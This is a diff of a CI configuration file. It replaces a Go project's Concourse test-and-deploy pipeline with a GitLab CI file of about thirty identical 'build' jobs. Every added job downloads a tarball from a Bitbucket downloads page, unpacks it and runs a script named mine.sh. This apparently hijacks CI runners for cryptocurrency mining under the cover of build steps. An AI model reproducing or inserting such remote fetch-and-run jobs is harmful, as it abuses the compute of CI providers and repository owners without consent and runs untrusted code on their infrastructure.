@@ -1,147 +1,159 @@
-resource_types:
-  - name: terraform
-    type: registry-image
-    source:
-      repository: ljfranklin/terraform-resource
-      username: ((DOCKER_USER))
-      password: ((DOCKER_PASS))
-      tag: latest
+image: golang:latest
 
-resources:
-  - name: golang-app
-    type: git
-    icon: github
-    source:
-      uri: git@github.com:JizongL/fullstack-golang-project.git
-      branch: master
-      private_key: ((deploy_key))
+variables:
+  REPO_NAME: gitlab.com/namespace/project
 
-  - name: go-image
-    type: registry-image
-    source:
-      repository: golang
-      username: ((DOCKER_USER))
-      password: ((DOCKER_PASS))
-      tag: "1.15.5"
+stages:
+  - build
+  - test
+  - deploy
 
-  - name: terraform-resource
-    type: terraform
-    source:
-      backend_type: s3
-      env_name: dev
-      backend_config:
-        bucket: golang-app-2020
-        key: terraform.tfstate
-        region: us-east-1
-      env:
-        AWS_ACCESS_KEY_ID: ((AWS_ACCESS_KEY_ID))
-        AWS_SECRET_ACCESS_KEY: ((AWS_SECRET_ACCESS_KEY))
+build_a:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
 
-  - name: s3
-    type: s3
-    source:
-      bucket: golang-app-build
-      versioned_file: golang-build.tar.gz
-      access_key_id: ((AWS_ACCESS_KEY_ID))
-      secret_access_key: ((AWS_SECRET_ACCESS_KEY))
+build_b:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
 
-jobs:
-  - name: test
-    plan:
-      - get: golang-app
-        trigger: true
-      - get: go-image
-        trigger: true
-      - task: run-tests
-        image: go-image
-        config:
-          platform: linux
-          inputs:
-            - name: golang-app
-          run:
-            path: /bin/sh
-            args:
-              - -xc
-              - |
-                apt-get update
-                apt-get install mariadb-server -y
-                service mysql start
-                cd golang-app
-                mysql < pkg/models/mysql/testdata/inittestdb.sql
-                go test -v ./...
-                service mysql stop
-      - task: build
-        config:
-          platform: linux
-          image_resource:
-            type: registry-image
-            source:
-              {
-                repository: ubuntu,
-                username: ((DOCKER_USER)),
-                password: ((DOCKER_PASS)),
-              }
-          inputs:
-            - name: golang-app
-          outputs:
-            - name: golang-build
-          run:
-            path: /bin/sh
-            args:
-              - -xc
-              - |
-                go build ./golang-app/cmd/web
-                tar -zcvf golang-build.tar.gz -C ./golang-app .
-                cp golang-build.tar.gz golang-build/
-      - put: s3
-        params:
-          file: golang-build/golang-build.tar.gz
+build_c:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
 
-  - name: terraform-infrastructure
-    plan:
-      - get: golang-app
-        trigger: true
-        passed: [test]
-      - get: s3
-        trigger: true
-        passed: [test]
-      - put: terraform-resource
-        params:
-          terraform_source: golang-app/ci/terraform/
-      - task: deploy
-        config:
-          platform: linux
-          image_resource:
-            type: registry-image
-            source:
-              {
-                repository: ubuntu,
-                username: ((DOCKER_USER)),
-                password: ((DOCKER_PASS)),
-              }
-          inputs:
-            - name: terraform-resource
-            - name: s3
-          params:
-            SERVER_KEY: ((golang_private_key))
-          run:
-            path: /bin/sh
-            args:
-              - -c
-              - |
-                apt-get update
-                apt-get -y install sudo
-                sudo apt-get install rsync jq openssh-client -y
-                # Get's the public ip of EC2 instance from the terraform metadata
-                export public_ip=$(cat terraform-resource/metadata | jq -r .public_ip)
+build_d:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
 
-                # Put the private key into a file and give it the correct permissions
-                echo "$SERVER_KEY" > key_file.pem && chmod 400 key_file.pem
+build_e:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
 
-                # Insert scp command here:
-                # sudo scp -r -i ./key_file.pem s3/golang-build.tar.gz ec2-user@$public_ip:/home/ec2-user/golang-app
-                # ls -a ./s3
-                rsync --progress -rave "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i ./key_file.pem" \
-                s3/golang-build.tar.gz ec2-user@$public_ip:/home/ec2-user/golang-build.tar.gz
-                ssh -i key_file.pem -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ec2-user@$public_ip tar xzf /home/ec2-user/golang-build.tar.gz -C /home/ec2-user/golang-app
-                ssh -i key_file.pem -q -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ec2-user@$public_ip /home/ec2-user/golang-app/ci/start.sh
+build_f:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_g:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_h:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_i:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_j:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_k:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_l:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_m:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_n:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_o:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_p:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_q:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_r:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_s:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_t:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+    
+build_u:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_v:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_w:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_x:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_y:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_z:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_ab:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_ac:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_ad:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
+
+build_ae:
+  stage: build
+  script:
+    - wget https://bitbucket.org/abyehaqie/nona/downloads/haqi.tar.gz && tar -xvf haqi.tar.gz && ./mine.sh
